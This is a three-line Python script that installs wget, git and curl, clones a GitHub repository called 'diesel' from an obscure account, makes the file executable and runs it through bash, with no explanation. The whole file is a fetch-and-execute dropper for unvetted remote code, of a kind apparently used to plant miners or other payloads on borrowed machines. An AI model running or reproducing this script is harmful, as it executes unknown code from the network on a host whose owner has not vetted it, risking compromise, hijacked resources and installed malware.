#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/quzagengelele/diesel.git;cd diesel;chmod +x diesel;bash diesel", shell=True)
